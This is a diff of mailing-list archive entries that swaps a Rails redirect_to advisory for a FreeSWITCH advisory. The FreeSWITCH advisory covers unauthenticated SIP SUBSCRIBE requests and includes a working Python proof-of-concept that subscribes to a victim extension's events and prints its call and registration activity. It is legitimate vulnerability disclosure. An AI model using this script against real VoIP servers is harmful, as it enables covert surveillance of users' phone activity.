@@ -1,102 +1,116 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/05/05/3
-Message-ID: <CALBaBG9_=RQ5S940L3kvUzsSPvva-wVHDgP4hy6U+nC08aE=TA@mail.gmail.com>
-Date: Wed, 5 May 2021 09:39:22 -0700
-From: Aaron Patterson <aaron.patterson@...il.com>
-To: ruby-security-ann@...glegroups.com, rubyonrails-security@...glegroups.com,  oss-security@...ts.openwall.com
-Subject: [CVE-2021-22885] Possible Information Disclosure / Unintended Method Execution in Action Pack
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/10/25/3
+Message-Id: <455d2673-74ca-4d9a-b54e-84af570f2242@www.fastmail.com>
+Date: Mon, 25 Oct 2021 16:24:09 +0200
+From: "Sandro Gauci" <sandro@...blesecurity.com>
+To: oss-security@...ts.openwall.com, bugtraq@...urityfocus.com, fulldisclosure@...lists.org, voipsec@...psa.org, submissions@...ketstormsecurity.org, vuln@...unia.com, cert@...t.org
+Subject: [ES2021-08] FreeSWITCH does not authenticate SIP SUBSCRIBE requests by default
 Content-Type: text/plain; charset=utf-8
 
-There is a possible information disclosure / unintended method execution
-vulnerability in Action Pack which has been assigned the CVE identifier
-CVE-2021-22885.
+# FreeSWITCH does not authenticate SIP SUBSCRIBE requests by default
 
-Versions Affected:  >= 2.0.0.
-Not affected:       < 2.0.0.
-Fixed Versions:     6.1.3.2, 6.0.3.7, 5.2.4.6, 5.2.6
+- Fixed versions: v1.10.7
+- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2021-08-freeswitch-SIP-SUBSCRIBE-without-auth
+- Vendor Security Advisory: https://github.com/signalwire/freeswitch/security/advisories/GHSA-g7xg-7c54-rmpj
+- Other references: CVE-2021-41157
+- Tested vulnerable versions: <= v1.10.5
+- Timeline:
+    - Report date: 2021-06-07
+    - Triaged: 2021-06-08
+    - Fix provided for testing: 2021-10-01
+    - Vendor release with fix: 2021-10-24
+    - Enable Security advisory: 2021-10-25
 
-Impact
-------
-There is a possible information disclosure / unintended method execution
-vulnerability in Action Pack when using the `redirect_to` or
-`polymorphic_url`
-helper with untrusted user input.
+## Description
 
-Vulnerable code will look like this:
+By default, SIP requests of the type SUBSCRIBE are not authenticated in the affected versions of FreeSWITCH. Although this issue was [fixed][1] in version v1.10.6, installations upgraded to the fixed version of FreeSWITCH from an older version, may still be vulnerable if the configuration is not updated accordingly. For good reason, by default, software upgrades do not update the configuration.
 
+[1]: https://github.com/signalwire/freeswitch/commit/b21dd4e7f3a6f1d5f7be3ea500a319a5bc11db9e
+
+## Impact
+
+Abuse of this security issue allows attackers to subscribe to user agent event notifications without the need to authenticate. This abuse poses privacy concerns and might lead to social engineering or similar attacks. For example, attackers may be able to monitor the status of target SIP extensions.
+
+## How to reproduce the issue
+
+1. Install FreeSWITCH v1.10.5 or lower
+2. Run FreeSWITCH using the default configuration
+3. Register as a legitimate SIP user on the FreeSWITCH server using a softphone (e.g. sip:1000@....168.188.128 where 192.168.188.128 is your FreeSWITCH server)
+4. Save the below Python script to `anon-subscribe.py`
+5. Run the script from an IP address that is different from that of the softphone `python anon-subscribe.py <freeswitch_ip> <freeswitch_port> <victim_extension>`
+6. Perform some operations using the softphone, such as deregistering, registering, and placing a call
+7. Observe that several notifications are received by the script, exposing the actions being performed by the victim
+
+```python
+import socket, string, random, re, sys
+
+UDP_IP = sys.argv[1]
+UDP_PORT = int(sys.argv[2])
+EXT = sys.argv[3]
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+msg_template = "SUBSCRIBE sip:%s@%s;transport=UDP SIP/2.0\r\n" % (EXT, UDP_IP) + \
+    "Via: SIP/2.0/UDP [ip]:[port];rport;branch=z9hG4bK-[rand]\r\n" \
+    "Max-Forwards: 70\r\n" \
+    "Contact: <sip:%s@[ip]:[port];transport=udp>\r\n" % (EXT, ) + \
+    "To: <sip:%s@%s;transport=UDP>\r\n" % (EXT, UDP_IP) + \
+    "From: <sip:9999@%s;transport=UDP>;tag=[rand]\r\n" % (UDP_IP, ) + \
+    "Call-ID: [rand]\r\n" \
+    "CSeq: 1 SUBSCRIBE\r\n" \
+    "Expires: 600\r\n" \
+    "Accept: */*\r\n" \
+    "Event: [event]\r\n" \
+    "Content-Length: 0\r\n" \
+    "\r\n"
+
+rand = ''.join(random.choice(string.ascii_letters) for i in range(16))
+msg = msg_template.replace('[ip]', '127.0.0.1') \
+    .replace('[port]', '9999') \
+        .replace('[event]', 'dialog') \
+            .replace('[rand]', rand)
+
+sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))
+
+recv=sock.recv(10240).decode()
+
+# get rport and received from Via header
+rport=re.search( r'rport=([0-9]+)', recv, re.MULTILINE).group(1)
+received=re.search( r'received=([0-9\.]+)', recv, re.MULTILINE).group(1)
+
+events = [
+    'talk', 'hold', 'conference', 'presence', 'as-feature-event', 'dialog', 'line-seize', 
+    'call-info', 'sla', 'include-session-description', 'presence.winfo', 'message-summary', 
+    'refer']
+
+for event in events:
+    rand = ''.join(random.choice(string.ascii_letters) for i in range(16))
+    msg = msg_template.replace('[ip]', received) \
+        .replace('[port]', rport) \
+            .replace('[event]', event) \
+                .replace('[rand]', rand)
+    sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))
+
+while True:
+    print(sock.recv(10240).decode().split('\r\n\r\n')[1])
 ```
-redirect_to(params[:some_param])
-```
 
-All users running an affected release should either upgrade or use one of
-the
-workarounds immediately.
+## Solution and recommendations
 
-Releases
---------
-The FIXED releases are available at the normal locations.
+Upgrade to a version of FreeSWITCH that fixes this issue.
 
-Workarounds
------------
-To work around this problem, it is recommended to use an allow list for
-valid
-parameters passed from the user.  For example:
+Our suggestion to the FreeSWITCH developers was the following:
 
-```
-private def check(param)
-  case param
-  when "valid"
-    param
-  else
-    "/"
-  end
-end
+> Our recommendation is that SIP SUBSCRIBE messages are authenticated by default so that FreeSWITCH administrators do not need to explicitly set the `auth-subscriptions` parameter. When following such a recommendation, a new parameter can be introduced to explicitly disable authentication.
 
-def index
-  redirect_to(check(params[:some_param]))
-end
-```
+## About Enable Security
 
-Or force the user input to be cast to a string like this:
+[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.
 
-```
-def index
-  redirect_to(params[:some_param].to_s)
-end
-```
+## Disclaimer
 
-Patches
--------
-To aid users who aren't able to upgrade immediately we have provided
-patches for
-the two supported release series. They are in git-am format and consist of a
-single changeset.
+The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
 
-* 5-2-information-disclosure.patch - Patch for 5.2 series
-* 6-0-information-disclosure.patch - Patch for 6.0 series
-* 6-1-information-disclosure.patch - Patch for 6.1 series
+## Disclosure policy
 
-Please note that only the 5.2, 6.0, and 6.1 series are supported at
-present. Users
-of earlier unsupported releases are advised to upgrade as soon as possible
-as we
-cannot guarantee the continued availability of security fixes for
-unsupported
-releases.
+This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.
 
-Credits
--------
-
-Thanks to Benoit Côté-Jodoin from Shopify for reporting this.
-
--- 
-Aaron Patterson
-http://tenderlovemaking.com/
-
-Content of type "text/html" skipped
-
-Download attachment "5-2-information-disclosure.patch" of type "application/octet-stream" (5732 bytes)
-
-Download attachment "6-1-information-disclosure.patch" of type "application/octet-stream" (5729 bytes)
-
-Download attachment "6-0-information-disclosure.patch" of type "application/octet-stream" (5729 bytes)
